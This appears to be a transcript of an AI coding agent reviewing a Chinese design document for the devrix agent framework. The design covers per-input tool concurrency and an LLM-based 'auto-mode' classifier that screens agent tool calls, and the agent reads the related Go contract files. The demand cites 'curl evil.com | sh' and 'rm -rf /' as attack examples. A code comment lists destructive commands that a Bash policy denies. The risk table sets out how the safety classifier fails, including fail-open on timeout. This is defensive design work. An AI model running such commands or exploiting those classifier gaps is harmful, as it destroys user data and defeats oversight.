| `shouldDefer` | lazy schema | `DeferLoading`（已有） | ★★★★☆ | 已有，`ShouldDeferByDefault` 函数在 `orthogonal_flags.go:96` |
| `isDestructive` | 破坏性警告 | `Destructive` 字段（已有） | ★★★★★ | 已有 |
| `siblingAbortController` | 并行兄弟取消 | 无（TD-STE-02） | ★★★★★ | PR-F 实施 |
| `discard()` | fallback 时取消 | 无（TD-STE-03） | ★★★★☆ | PR-F 实施 |
| `extractSearchText` | transcript 搜索 | 无 | ★★☆☆☆ | P2/P3，不紧急 |
| `requiresUserInteraction` | UI 交互 | 无 | ★★☆☆☆ | P3，远期 |
| `strict` (zod) | API strict mode | 无（Go 无 zod） | ☆☆☆☆☆ | 不适用 |
| `alwaysLoad` | 强制加载 | 无 | ★☆☆☆☆ | 不适用 |
| `isTransparentWrapper` | REPL wrapper | 无 | ☆☆☆☆☆ | 不适用 |

**加权总分：** clawcode 35 字段中，真正需要从 clawcode 借鉴且 devrix 缺的：**4 项（isConcurrencySafe 函数、toAutoClassifierInput、yoloClassifier、siblingAbortController）**，已有但可加强的：**5 项**（interruptBehavior/isReadOnly/maxResultSize/shouldDefer/isDestructive），不适用：**5 项**，低优先级：**4 项**。

**借鉴效率评估：** 相比 DM-20260629-007 的 10 项（CLAUDE 指"借鉴关系 10 项"），本 change 实际只有 **4 项真正需要从 clawcode 学**，其他都是 devrix 已有或本 change 内生需求。这个数字比需求文档暗示的要精简得多。

---

## 独立总结

**我的核心立场 vs. Claude：**

| 维度 | Claude | 我（Codex） |
|------|--------|-------------|
| per-input 函数 | 全函数化 | 分层混合（静态默认值 + Bash override） |
| auto-mode classifier | P0 实施，默认关 | 只加 interface，降 P2 |
| PR 数量 | 5 PR（合并 D+E） | 6 PR（维持） |
| GrowthBook | 降 P2 | **全删** |
| inputsEquivalent | 降 P3 | **保持 P2** |
| TD-STE-02/03 | 同 PR-F | 建议拆分 |

**博弈结论：** 本 change 的 scope 比需求文档暗示的更精简——真正需要实现的 clawcode 借鉴项只有 4 项（P0），其他 9 项要么是 devrix 已有，要么是本 change 内生的工程需求，不是"借鉴"。GrowthBook 是最大的 scope 膨胀点，建议用户明确是否接受全删。

codex
Let me check the key source files for precise details.

exec
/bin/zsh -lc 'cat /Users/fukai/workspace/devrix/openspec/changes/devrix-d2-tool-input-aware-concurrency-and-classifier/demand.md' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
# Demand: DM-20260702-009 — D2 Tool Input-Aware Concurrency + Auto-Mode Security Classifier + Tech-Debt Closure

**Demand ID:** DM-20260702-009
**Created:** 2026-07-02
**Priority:** P1
**Source:** 复盘 DM-20260702-008 P1 延期 (9 T) + DM-20260701-007 借鉴关系 10 项 + openspec/tech-debt/streaming-tool-executor-v2.md (TD-STE-01~06) + clawcode Tool interface 35 字段 (doc 53) + 复盘清单 6 项审计 → **13 T 点全纳入**

---

## 1. 问题陈述 (复盘 DM-20260702-008 P1)

DM-20260702-008 (Token Design 2.0, PR #376 已合并) 在 16 P0 T 点全量 IMPLEMENTED 后, 把 9 P1 T 点 (T16-T24) 明确延期到本 change. 复盘发现 2 个**未根治的次治本问题**:

### 1.1 根因 1 (RC-1): `ConcurrencySafe bool` 是 v2 静态字段, 不是 per-input 决策

devrix 现状 (`internal/shared/contracts/tool_surface.go:39-43`):

```go
// ConcurrencySafe: multiple invocations of the same tool may run in parallel
// without mutual interference (e.g. read_file on different paths).
ConcurrencySafe bool
```

- **问题**: 静态 bool, **per-tool**, 不知道具体 input
  - `bash` 永远 `ConcurrencySafe=false` (因为能 `rm -rf`), 但 `bash` 跑 `ls -la` 完全可以并发
  - `read_file` 永远 `ConcurrencySafe=true`, 但 read_file 一个 1GB 文件 8K 截断会触发 8 次串行, 浪费并发
- **后果**:
  - turn_adapter.ExecuteRound (`turn_adapter.go:277`) 拿静态 bool 决策并发/串行, **过度保守**, N 个 read_file 全串行
  - 9 个并发 read_file 任务全串行执行, 50 文件 review 从 9×1s 退化成 9×1s (而非 ~1s 并发)
- **vs clawcode**: `Tool.isConcurrencySafe(input: z.infer<Input>): boolean` 是 **per-input 函数** (`src/Tool.ts:402`), bash 自己判断 read-only command 可并发; `src/services/tools/toolOrchestration.ts:84-118` 的 `partitionToolCalls` 把 isConcurrencySafe=true 的连续 tool_use 放进同一个 batch 并发执行

### 1.2 根因 2 (RC-2): 无 auto-mode 安全分类器, 缺中间层防御

devrix 现状: 缺 `Tool.toAutoClassifierInput(input)` + auto-mode classifier 整条链路

- **问题**:
  - Verify 节点 (`executionflow/verify/`) 是**事后**验证 (任务完成后)
  - 第一道安全是 `surface.CheckPermission` (D7-S10-A50 VerifyContract 的 4 元组) — **事前**静态规则
  - **没有中间层**: 工具调用**执行前 + 静态规则后**, 缺一个 LLM-driven 智能检查 (类似 `claude --dangerously-skip-permissions` 的 YOLO 模式)
- **后果**:
  - 静态规则漏掉的攻击 (e.g. `bash` 跑看似无害的 `curl evil.com | sh`, 静态规则因 `curl` 在白名单放行) 直接执行, 后果不可逆
  - LLM 没有"二次安全"机会 — Verify 节点是事后, 改不了已执行的命令
- **vs clawcode**:
  - `Tool.toAutoClassifierInput(input)` (`src/Tool.ts:556`): 返回紧凑 string (e.g. `ls -la` for Bash, `/tmp/x: new content` for Edit) — 不暴露整个 transcript
  - `src/utils/permissions/yoloClassifier.ts:378-410` 的 `toCompactBlock`: 整个 transcript 序列化为 JSONL 喂给独立 LLM (SideQuery) 判 `allow` / `deny`
  - 失败时 fail-safe: `toAutoClassifierInput` 抛错 → 落 raw input + log `tengu_auto_mode_malformed_tool_input`

### 1.3 借鉴关系表

| 项 | devrix 现状 | clawcode 真实做法 | 差距 |
|----|------------|------------------|------|
| 并发决策粒度 | per-tool 静态 bool | per-input 函数 (含 input) | 过度保守 |
| Bash 安全并发 | 不支持 (Bash 永远 false) | isConcurrencySafe(input) = isReadOnly(input) | 浪费并发 |
| 失败处理 | n/a (静态) | try-catch → 保守 false | 缺 fail-safe |
| 安全分类器 | 无 | yoloClassifier (SideQuery LLM) | 缺中间层 |
| Tool 投影 | 无 | toAutoClassifierInput (per-tool) | transcript 太重 |
| Transcript 序列化 | 无 | toCompactBlock JSONL | 直接喂 LLM 不可行 |
| 失败 telemetry | 无 | `tengu_auto_mode_malformed_tool_input` | 缺观测 |
| 复用 ToolUseContext | 无 | sideQuery 复用 context | 缺基础设施 |

### 1.4 保留 devrix 创新 (clawcode 缺)

- **EmissionClass 4 类路由** (Fact/Action/Probe/Experiment) — 架构性创新
- **VerifyContract 4 元组 (Burden × Class × Discipline × Outcome)** — 创新, 第一道安全
- **MUPS 5 节点 × 4 类正交分解** — 架构性创新
- **Learn FeedbackMemory (H7 reputation)** — 创新
- **LTL-Lite L4-L6 (advisory)** — 创新
- **Token Design 2.0 (PersistToFile + offset/limit + per-message 200K)** — 创新 (P0 已落地)
- **task_kind 推 Filter v2** — 创新
- **ConvergenceContract / IterationBound / SourceUncertainty 4 control plane** — 创新 (P0 已落地)

### 1.5 复盘清单 (2026-07-02 审计) — 6 项吸收到本 change

复盘之前 discussion 留下的 6 项未实现项, 全部吸收进本 change (T25-T28 4 个新 T 点 + 2 项 tech-debt 关闭):

| # | 项 | 原状态 | 吸收路径 |
|---|----|--------|----------|
| 1 | **GrowthBook runtime override** | DM-20260702-008 借鉴关系 #8 标 P2, 未归任何 change | **T25 GrowthBook flag 集成** (per-tool 阈值 + classifier + concurrency 都可接, 默认关闭) |
| 2 | **TD-STE-01 混合批次并发** | openspec/tech-debt/streaming-tool-executor-v2.md P1, 未关 | **T18 partitionToolCalls 显式 close** (batch 间串行 + batch 内并发) |
| 3 | **TD-STE-06 ConcurrencySafe 注册表** | tech-debt P2, 未关 | **T16-T17 显式 close** (per-input `IsConcurrencySafe` + 19 工具 surface 默认) |
| 4 | **TD-STE-02 Bash sibling abort** | tech-debt P1, 未归任何 change | **T26 BashTool abort 兄弟并行 + synthetic tool_result** |
| 5 | **TD-STE-03 discard on fallback** | tech-debt P1, 未归任何 change | **T27 StreamingToolExecutor.Discard()** (依赖 TD-QL-03 已 CLOSED) |
| 6 | **clawcode Tool.inputsEquivalent** | 35 字段中未在 devrix 落地的字段, 跟 ContentReplacementState 联动 | **T28 inputsEquivalent** (cache invalidation 收口) |

---

## 2. 目标

### 2.1 治本目标 (per-input 决策 + 智能中间层)

| 目标 | 衡量 | 现状 | 目标 |
|------|------|------|------|
| Bash 只读可并发 | N 并发 `git status` 延迟 | 全串行 (9×1s) | 1×1s (1 batch) |
| Read 并发粒度 | N 并发 `read_file` 延迟 | 全串行 | 1 batch 并发 |
| Fail-safe | `isConcurrencySafe` 抛错时 | n/a | 保守 false (不并发) |
| 工具投影 | `toAutoClassifierInput` 覆盖率 | 0/19 | 19/19 全覆盖 |
| Auto-mode classifier | 中间层防御 | 无 | LLM SideQuery + 5s timeout |
| 失败 telemetry | `auto_mode_malformed_tool_input` 事件 | 0 | ≥1 per 异常 |
| 端到端 e2e | 50 文件 review 用并发 (clawcode `partitionToolCalls`) | 串行 ~150 calls 串行 | ~30 batches 并发 |

### 2.2 保留目标 (P0 已落地的 16 T 不动)

- Token Design 2.0 (PersistToFile + offset/limit + per-message 200K)
- ToolSpec v3 6 control plane 字段 (EmissionClass / ConvergenceContract / IterationBound / SourceUncertainty / MaxResultSizeChars / TruncateMarkerText)
- VerifyContract 4 元组 (第一道安全, 不动)
- EmissionClass 4 类路由 (不动)
- task_kind 推 Filter v2 (不动)
- Learn FeedbackMemory (不动)
- LTL-Lite L4-L6 advisory (不动)
- MUPS 5 节点 × 4 类正交分解 (不动)

### 2.3 不在本次目标 (走下个 change)

- Transcript 完整 LLM 上下文 (10+ 工具全 transcript) — P2
- 多 LLM ensemble (ensemble classifier) — P3
- 跨 session reputation → classifier input — P2 (跟 Learn FeedbackMemory 联动)
- Classifier-driven microcompact (T13 PerMessageBudget 联动) — P2
- Bash 22 zsh rules 改造 (DM-20260701-007 OOS-7 弱相关) — 域自治
- D1/D3/D4/D6 域元数据 (DM-20260701-007 OOS-8) — 域自治

---

## 3. 验收标准

| ID | 标准 | 优先级 | 验证 |
|----|------|--------|------|
| AC1 | `ToolSurface` 加 `IsConcurrencySafe(input []byte) bool` 方法, 19 工具全部默认实现 (per-input 决策) | P0 | 19 工具 surface_test PASS |
| AC2 | `ToolSurface` 加 `ToAutoClassifierInput(input []byte) string` 方法, 19 工具全部默认实现 | P0 | 19 工具 surface_test PASS |
| AC3 | `ChannelRouter.ExecuteRound` (`turn_adapter.go:277`) 改造为 `partitionToolCalls`-style: 把 `IsConcurrencySafe=true` 的连续 tool_call 放进同 batch, batch 内并发, batch 间串行 | P0 | 50 文件 e2e: 50 read_file 拆成 ~10 batch, 总延迟 < 串行 / 5 |
| AC4 | Auto-mode classifier (`internal/layers/orchestration/decisionplanning/auto_classifier.go` 新建): 接收 `toCompactBlock` JSONL transcript, 调 SideQuery (5s timeout), 返 `allow` / `deny` + reason | P0 | 7 单测 (allow/deny/timeout/throw/malformed_input/empty_transcript/policy_violation) |
| AC5 | `tengu_auto_mode_malformed_tool_input` 对等 telemetry 事件 (devrix 用 `auto_mode.malformed_tool_input` metric) | P0 | metric_test PASS |
| AC6 | Fail-safe: `IsConcurrencySafe` 抛错时保守 false (不并发); `ToAutoClassifierInput` 抛错时落 raw input + emit metric | P0 | 2 单测 |
| AC7 | Bash 工具: `isReadOnly(input) → IsConcurrencySafe(input) = true` (镜像 clawcode `BashTool.tsx:434-437`) | P0 | bash_runner_test |
| AC8 | 19 工具 default ToAutoClassifierInput 走 registered surface 而非 hardcoded fallback (避免 silent default) | P0 | surface_metadata_gate_test 加 1 case |
| AC9 | 13 T 点 (T16-T28) 全 IMPLEMENTED, 走 D2-S15-A02 + D7-S9-A50 + D7-S10-A50 + D7-S11-A50 t-registry | P0 | t-registry + tasks.md |
| AC10 | 端到端 e2e: 50 文件 review + 9 并发 read_file batch, 任务完成时间 < 串行 / 3 | P0 | review50_e2e_test.go 加并发版本 |
| AC11 | **GrowthBook override** — 19 工具 per-tool 阈值 + Classifier enable + ConcurrencySafe 全部可走 GrowthBook feature flag 运行时调, 默认全关 | P0 | growthbook_override_test + 19 工具 default + Production-Safety |
| AC12 | **Bash sibling abort** — 并行 Bash 中一个失败, 兄弟 Bash 通过 `siblingAbortController` abort + 返 synthetic `Cancelled: parallel tool call errored` tool_result | P1 | bash_sibling_abort_test (mock 双 Bash, 第一个 error → 第二个 cancelled) |
| AC13 | **Discard on fallback** — QueryLoop fallback model 切换前调 `StreamingToolExecutor.Discard()`, 在途/queued 工具注入 `streaming_fallback` synthetic result | P1 | discard_test (fallback 路径无 orphan tool_use) — 依赖 TD-QL-03 已 CLOSED |
| AC14 | **inputsEquivalent(a, b)** — 19 工具 surface 加 `inputsEquivalent(a, b []byte) bool` 默认实现, 配合 ContentReplacementState (T04) 实现 cache invalidation 收口 | P2 | inputs_equivalent_test (19 工具 × 3 case = 57 单测) |

---

## 4. 依赖与约束

| 类型 | 内容 |
|------|------|
| **上游依赖** | DM-20260702-008 (Token Design 2.0 已合) 提供 PersistToFile 持久化 (本 change 的 SideQuery transcript 可用 PersistToFile 兜底) |
| **上游依赖** | DM-20260701-007 (MUPS ToolSpec v3) 提供 6 control plane 字段 (本 change 的 `IsConcurrencySafe`/`ToAutoClassifierInput` 是 ToolSurface interface 新方法, 不冲突) |
| **上游依赖** | DM-20260618-001 (Tool Spec v2) 提供 9 字段基线 (本 change 扩展 surface interface, 0 break) |
| **上游依赖** | `Learn FeedbackMemory` (DM-20260701-007 P1) 提供 reputation data (本 change 暂不联动, P2 走) |
| **约束** | ToolSpec v3 struct 不能加新字段 (会 break 9 → 15 字段的命名约定), 新方法必须走 `ToolSurface` interface, 不进 ToolSpec |
| **约束** | `IsConcurrencySafe` 必须 fail-safe (抛错 → false, 不并发), 不能 panic 上抛到 ExecuteRound |
| **约束** | `ToAutoClassifierInput` 抛错 → log metric + 落 raw input, 不能 panic 上抛 |
| **约束** | 13 T 点 (T16-T28) = 10 项 P0 (T16-T25) + 2 项 P1 (T26/T27) + 1 项 P2 (T28), P0 全 P0 验收 (符合 P0 阻断条件) |
| **约束** | Classifier LLM SideQuery 5s timeout (硬上限, 不可改) |
| **约束** | 0 业务代码 out-of-scope diff (跟 Token Design 2.0 收口 PR #376 同样的纪律) |
| **约束** | T26 Bash sibling abort 不能 abort 父 QueryLoop turn, 只 abort 同 batch 兄弟 |
| **约束** | T27 discard on fallback 依赖 TD-QL-03 (已 CLOSED, DM-20260618-010), 不依赖未关闭的 tech-debt |
| **约束** | T25 GrowthBook 默认全关, Production-Safety: 不能在未 flag 开启时影响用户行为 |

---

## 5. 变更范围

### 5.1 新增 (新建)

- `internal/shared/contracts/tool_surface_v4.go` (interface 扩展方法)
- `internal/layers/orchestration/decisionplanning/auto_classifier.go` (新建 classifier)
- `internal/layers/orchestration/decisionplanning/auto_classifier_test.go` (7+ 单测)
- `internal/layers/orchestration/decisionplanning/to_compact_block.go` (JSONL transcript 序列化)
- `internal/layers/orchestration/decisionplanning/to_compact_block_test.go`
- `internal/layers/bootstrap/turn_adapter_partition_test.go` (50 文件 e2e 并发版本)
- `internal/layers/contextengine/enforce/tools/surface/orthogonal_flags_v2.go` (per-tool IsConcurrencySafe/ToAutoClassifierInput 19 工具默认)
- `internal/layers/observability/instrument/growthbook/` (新建, GrowthBook override registry)
- `internal/layers/observability/instrument/growthbook/persist_threshold_override.go` (T04 ContentReplacementState GrowthBook 联动)
- `internal/layers/observability/instrument/growthbook/concurrency_override.go` (T16-T17 IsConcurrencySafe GrowthBook 联动)
- `internal/layers/observability/instrument/growthbook/classifier_override.go` (T22-T23 AutoModeClassifier GrowthBook 联动)
- `internal/layers/contextengine/enforce/tools/bash/sibling_abort.go` (T26 BashTool abort 兄弟并行)
- `internal/layers/contextengine/enforce/tools/bash/sibling_abort_test.go`
- `internal/bootstrap/discard_on_fallback.go` (T27 StreamingToolExecutor.Discard())
- `internal/bootstrap/discard_on_fallback_test.go`
- `internal/layers/contextengine/enforce/tools/surface/inputs_equivalent.go` (T28 per-tool inputsEquivalent 默认)
- `internal/layers/contextengine/enforce/tools/surface/inputs_equivalent_test.go` (19 工具 × 3 case)

### 5.2 修改 (扩展)

- `internal/layers/contextengine/enforce/tools/surface/*.go` — 19 surface 加 `IsConcurrencySafe` / `ToAutoClassifierInput` / `inputsEquivalent` 默认实现
- `internal/bootstrap/turn_adapter.go:277` — `ExecuteRound` 改造为 `partitionToolCalls`-style batch
- `internal/layers/contextengine/enforce/tools/surface/surface_metadata_gate_test.go` — 加 AC8 case
- `internal/layers/orchestration/decisionplanning/classifier.go` — `IntentClassifier` 加 `ClassifyToolUse(transcript, sideQuery) YoloResult` 方法
- `internal/layers/contextengine/enforce/tools/bash/bash_runner.go` — `BashTool` 集成 `siblingAbortController` (T26)
- `internal/bootstrap/streaming_executor.go` (新建) — `Discard()` 方法 + fallback 路径 wiring (T27)
- `openspec/tech-debt/streaming-tool-executor-v2.md` — TD-STE-01/02/03/06 closed-by 标注
- `openspec/specs/d2-context-engine/t-registry.md` — D2-S15-A02-T16..T28 注册
- `openspec/specs/d7-orchestration/t-registry.md` — D7-S9-A50-T16..T19 + D7-S10-A50-T20..T24 + 新 T26-T28 注册
- `openspec/specs/d3-llm-gateway/t-registry.md` — D3-S3-A01 SideQuery 5s timeout + retry + budget 注册
- `openspec/t-registry.md` — v5.15.0 主索引 +13 T

### 5.3 不变更 (0 业务代码 out-of-scope diff 原则)

- ToolSpec v3 struct (6 control plane 字段不动, 0 break)
- 已合入 P0 T01-T15 + T25-T28 (Token Design 2.0 16 T 全保留)
- EmissionClass 4 类路由 (不动)
- VerifyContract 4 元组 (第一道安全, 不动)
- MUPS 5 节点 × 4 类正交分解 (不动)

---

## 6. 风险评估

| 风险 | 影响 | 缓解 |
|------|------|------|
| Bash `isReadOnly` 误判 (e.g. `bash -c "ls; rm -rf /"`) 触发并发 | 高 — 误把 destructive bash 标并发 | `BashTool.isReadOnly` 必须 parse 整个 command tree (仿 clawcode parseForSecurity), 不可靠时保守 false |
| `IsConcurrencySafe` 抛错 → panic 上抛到 ExecuteRound | 高 — turn 崩溃 | fail-safe: catch + log metric + return false, 已 AC6 覆盖 |
| Auto-mode classifier LLM 幻觉 (返 allow 但实际 deny) | 中 — 安全漏判 | 5s timeout 硬上限 + 不替换 VerifyContract 4 元组 (它是 ground truth) + auto-mode 默认关闭 (P2 再开) |
| `ToAutoClassifierInput` 抛错 → 上抛, ExecuteRound 中断 | 中 — turn 崩溃 | fail-safe: catch + emit metric + fall back to raw input (AC6) |
| Bash `parseForSecurity` 性能 (每 tool_call 都 parse) | 低 — 单 turn 几 ms | 缓存 parse 结果 (per toolUseID) + 拒绝超长 command (>10K chars) |
| SideQuery LLM 不可用 (网络/CK) | 中 — auto-mode 失能 | 5s timeout 后默认 allow (fail-open) + metric `auto_mode.classifier_unavailable` + 不替换 VerifyContract |
| 19 工具 surface 改 IsConcurrencySafe 默认 → 破坏现有并发行为 | 中 — 现有 turn 变串行 | AC1 强制 19 工具默认保持 v2 的 `ConcurrencySafe` 行为, per-input 只在显式 override 时生效 |
| transcript 序列化 leak 隐私 (含 user message, file content) | 中 — PII 风险 | toCompactBlock 只投影 tool_use 块, 不投影 tool_result 内容, 跟 clawcode 一致 |

---

## 7. 关联需求

### 7.1 Supersede (narrow)

- 无 (本 change 是增量, 不撤回任何已合 P0 T)

### 7.2 Related (上游 — 已合)

- DM-20260702-008 (Token Design 2.0) — 提供 PersistToFile (classifier transcript 可用)
- DM-20260701-007 (MUPS ToolSpec v3) — 提供 6 control plane 字段 (不冲突, 本 change 加 ToolSurface interface 新方法)
- DM-20260618-001 (Tool Spec v2) — 提供 9 字段基线 (v4 加 interface 方法, 0 break)
- DM-20260618-002 (Surface Permission Extension) — VerifyContract 4 元组 (本 change 第二道安全, 跟 auto-mode 互补)
- DM-20260618-003 (Surface Lazy Loading) — DeferLoading (不冲突)

### 7.3 Related (前置)

- DM-20260629-001 (D7 DSAFT restructuring) — Span Evidence 100%
- DM-20260625-019 (D7 5-node coverage) — MUPS Phase 3 PR-C1 跨域类型
- DM-20260626-005 (D7 6S Verify promotion) — executionflow/verify/ 物理 promote

### 7.4 Related (下游 — 走 P2/P3 后续 change)

> OOS 编号 OOS-NEW-1~10 (跟 tasks.md + proposal.md 同步), 原 OOS-1 (GrowthBook 走 T25) + TD-STE-01/02/03/06 (4 项 tech-debt 关闭) + inputsEquivalent (走 T28) 已吸收到本 change.

- OOS-NEW-1: Transcript 完整 LLM 上下文 (10+ 工具全 transcript) — P2
- OOS-NEW-2: 多 LLM ensemble (ensemble classifier) — P3
- OOS-NEW-3: 跨 session reputation → classifier input — P2
- OOS-NEW-4: Classifier-driven microcompact (T13 PerMessageBudget 联动) — P2
- OOS-NEW-5: LLM SideQuery 模型选择 (Haiku vs Sonnet) — P2
- OOS-NEW-6: YoloClassifier telemetry 跟 Learn FeedbackMemory 联动 — P2
- OOS-NEW-7: 工具 progress 流 (TD-STE-04) — P2
- OOS-NEW-8: synthetic error 统一 (TD-STE-05) — P2
- OOS-NEW-9: Bash 22 zsh rules 改造 (DM-20260701-007 OOS-7 弱相关) — 域自治
- OOS-NEW-10: Filter v2 workspace 维 (DM-20260701-007 OOS-10) — 走 P1 独立 change

---

## 8. 路线图 (6 PR 收口)

| PR | 范围 | T 点 | AC | tech-debt closed | 估时 |
|----|------|------|-----|------------------|------|
| **PR-A** | `ToolSurface` interface v4 + 19 工具 `IsConcurrencySafe` 默认实现 | T16-T17 | AC1/AC2/AC8 | TD-STE-06 | W1 D1-D2 |
| **PR-B** | `ExecuteRound` partitionToolCalls 改造 + 50 文件 e2e 并发版 | T18-T19 | AC3/AC10 | TD-STE-01 | W1 D3-D5 |
| **PR-C** | `ToAutoClassifierInput` + 19 工具默认实现 | T20-T21 | AC2/AC4 | — | W2 D1-D2 |
| **PR-D** | Auto-mode classifier + toCompactBlock + ChannelRouter 集成 | T22-T23 | AC4/AC5/AC6/AC7 | — | W2 D3-D4 |
| **PR-E** | Classifier 测试 + telemetry + 端到端 e2e | T24 | AC1-AC10 | — | W2 D5 |
| **PR-F** | GrowthBook override + Bash sibling abort + Discard on fallback + inputsEquivalent | T25-T28 | AC11/AC12/AC13/AC14 | TD-STE-02 + TD-STE-03 | W3 D1-D2 |
| **合计** | 6 PR squash merge | 13 T + 14 AC | — | 4 tech-debt | 1 周 + 2 天 |

exec
/bin/zsh -lc 'cat /Users/fukai/workspace/devrix/internal/shared/contracts/tool_surface.go' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
package contracts

import (
	"context"
	"encoding/json"

	"github.com/devrix/devrix/internal/shared/types"
)

// ToolSpec is a neutral LLM tool schema (decoupled from D3 llmgateway.ToolCall
// and D2 tools.ToolSchema). All cross-layer tool exchanges use ToolSpec.
//
// DSAFT: TOOL-SURFACE-1-A01 (DM-20260617-007 devrix-tool-surface-contract)
// TOOL-SURFACE-1-A01-F02 (DM-20260618-001 devrix-tool-spec-enrichment):
//
//	4 orthogonal bool flags supplement the legacy Risk enum so that
//	PerAgentFilter / PerRiskFilter / turn_adapter can make fine-grained
//	decisions without parsing Risk strings.
type ToolSpec struct {
	Name        string
	Description string
	Parameters  string // JSON Schema
	Risk        types.RiskLevel

	// ReadOnly: tool does not modify the filesystem (read_file / glob / grep / lsp / verify).
	// PerAgentFilter consumes this to auto-extend the explore agent's visible set.
	ReadOnly bool

	// Destructive: tool performs irreversible operations (rm / force_push / delete_branch).
	// PerRiskFilter in plan_mode MAY consult this together with OpenWorld to decide
	// whether the LLM can call the tool without human confirmation.
	Destructive bool

	// OpenWorld: tool's side effects extend beyond the local machine
	// (web_fetch / send_im_message / free_fork spawning child agents).
	// PerRiskFilter uses this in plan_mode to drop the tool from the visible set.
	OpenWorld bool

	// ConcurrencySafe: multiple invocations of the same tool may run in parallel
	// without mutual interference (e.g. read_file on different paths).
	// turn_adapter.ExecuteRound uses this to decide parallel vs sequential dispatch.
	ConcurrencySafe bool

	// DeferLoading marks tools whose full schema is not sent to the LLM on
	// every turn. turn_adapter.Prepare filters these out of the system
	// prompt; the LLM must call tool_search to retrieve the schema on
	// demand. Empty / unused tools (delegate_*, *_background) get this
	// flag at BuildSurfaces time. Runtime ToolFilter.ShouldDefer can also
	// add it (e.g. plan_mode → defer all open-world tools).
	//
	// DSAFT: TOOL-SURFACE-1-A01-F08 (DM-20260618-003 devrix-surface-lazy-loading).
	DeferLoading bool

	// --- ToolSpec v3 (D2-S15-A02-T06): 6 control plane fields ---
	// DSAFT: D2-S15-A02-T06 — control plane; runtime-bound; defaults in tool_surface_v3.go.
	EmissionClass       EmissionClass       `json:"emission_class"`
	ConvergenceContract ConvergenceContract `json:"convergence_contract"`
	IterationBound      IterationBound      `json:"iteration_bound"`
	SourceUncertainty   SourceUncertainty   `json:"source_uncertainty"`
	MaxResultSizeChars  int                 `json:"max_result_size_chars"`
	TruncateMarkerText  string              `json:"truncate_marker_text"`
}

// ToolResult is the return type of ToolSurface.Execute.
//
// DSAFT: TOOL-SURFACE-1-A01-F04
type ToolResult struct {
	Output string
	Error  string
}

// InterruptMode describes how a tool responds to a context cancellation signal.
//
// DSAFT: TOOL-SURFACE-1-A01-F05 (DM-20260618-001 devrix-tool-spec-enrichment).
// The 1:1 mapping with clawcode Tool.interruptBehavior (Tool.ts:410-416)
// lets long-run tools opt out of waiting for natural completion when the
// user issues a new message mid-turn.
type InterruptMode string

const (
	// InterruptCancel: the surface MUST select on ctx.Done() and return
	// ctx.Err() within 200ms of cancellation.
	InterruptCancel InterruptMode = "cancel"

	// InterruptBlock: the surface ignores ctx cancellation and runs to
	// natural completion. The default for short-run tools.
	InterruptBlock InterruptMode = "block"
)

// ToolSurface is a discoverable entry point for a group of related tools.
//
// Per devrix Facet Decomposition (DM-020 D-c + architecture-design.md §1.1),
// ToolSurface is a 拆面 contract exposed to D2 (consumer) by D2 surface
// implementations. Library packages (freefork / tracker / verify / etc.) do
// not depend on this contract — the dependency direction is:
//
//	contracts ← surface (in tools/surface) ← library
//
// Design principles:
//   - Accept interfaces, return structs (ToolSpec / ToolResult are structs)
//   - 6 methods, each 1-3 lines in typical implementations
//   - Does not hold ctx; Execute / Tools accept ctx
//   - Does NOT make permission decisions (IPermissionGate runs in
//     turn_adapter.ExecuteRound, BEFORE surf.Execute)
//
// DSAFT: TOOL-SURFACE-1-A01 (DM-20260617-007) + TOOL-SURFACE-1-A01-F05
// (DM-20260618-001 — InterruptBehavior addition) +
// TOOL-SURFACE-1-A01-F07 (DM-20260618-002 — CheckPermission addition).
type ToolSurface interface {
	// Name returns the surface identifier (used in devrix.yaml config,
	// log tags, and `devrix tool list` output).
	Name() string

	// Tools returns the list of tools this surface exposes for the given
	// (workDir, sessionID) context. Implementations may filter
	// conditionally (e.g. LSPToolSurface checks lsp.enabled).
	//
	// The returned slice should be deterministic for stable LLM tool
	// schema hashing (callers may cache it per session).
	Tools(ctx context.Context, workDir, sessionID string) []ToolSpec

	// RiskLevel returns the RiskLevel for a single tool name. Unknown
	// names return types.RiskLevelLow (defensive default).
	//
	// Called by turn_adapter.ExecuteRound to populate
	// IPermissionGate.Request's risk argument.
	RiskLevel(name string) types.RiskLevel

	// Execute dispatches a single tool call through the surface's
	// internal mechanism. Returns ToolResult{Output, Error}; non-empty
	// Error means the caller should not block.
	//
	// workDir and sessionID are passed explicitly (not via ctx value) so
	// surfaces do not need to know about D1/D2 ctx conventions.
	Execute(ctx context.Context, name, input, workDir string) (*ToolResult, error)

	// InterruptBehavior returns the interrupt mode for the named tool.
	// Long-run tools (FreeForkSurface.free_fork) MUST return InterruptCancel
	// and select on ctx.Done() inside Execute; everything else returns
	// InterruptBlock by convention.
	//
	// The default is InterruptBlock (existing 7 surfaces); only surfaces
	// that genuinely run >5s in normal use override this.
	InterruptBehavior(name string) InterruptMode

	// CheckPermission is the per-tool pre-dispatch hook. turn_adapter
	// calls it BEFORE Execute; a non-Allow decision skips Execute and
	// the LLM gets a PermissionDeniedError / PermissionAskRequiredError
	// envelope in result.Results[i].Error.
	//
	// 5 surfaces return Allow unconditionally (read-only / stateless
	// tools). 2 surfaces override:
	//   - BuiltinSurface  → BashASTPolicy parses the command and
	//     denies rm -rf /, dd, mkfs, sudo, chmod 777 /.
	//   - FreeForkSurface → delegates to IPermissionGate.CheckPermission
	//     (multi-agent spawns need the global policy).
	//
	// Performance budget: < 5ms p99 (BashASTPolicy is the hot path).
	// DSAFT: TOOL-SURFACE-1-A01-F07 (DM-20260618-002).
	CheckPermission(ctx context.Context, spec ToolSpec, input json.RawMessage) Decision
}

exec
/bin/zsh -lc 'cat /Users/fukai/workspace/devrix/internal/layers/contextengine/enforce/tools/surface/orthogonal_flags.go' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
package surface

import (
	"context"
	"encoding/json"

	"github.com/devrix/devrix/internal/shared/contracts"
)

// OrthogonalFlags is the 4-bool truth table for each tool name in devrix
// (TOOL-SURFACE-1-A01-F02 — DM-20260618-001 devrix-tool-spec-enrichment).
//
// Each entry is the authoritative classification that the corresponding
// surface MUST apply to its ToolSpec. The hard-coded table is intentional:
// it keeps the surface code mechanical and the S3-Gate review a 1:1
// diff against design.md §2.1.2.
//
// Truth table (column = flag, row = tool name):
//
//	tool_name    | ReadOnly | Destructive | OpenWorld | ConcurrencySafe
//	-------------+----------+-------------+-----------+----------------
//	read_file    |    Y     |      N      |     N     |       Y
//	write_file   |    N     |      Y      |     N     |       N
//	edit_file    |    N     |      Y      |     N     |       N
//	bash         |    N     |      Y      |     N     |       Y
//	grep         |    Y     |      N      |     N     |       Y
//	glob         |    Y     |      N      |     N     |       Y
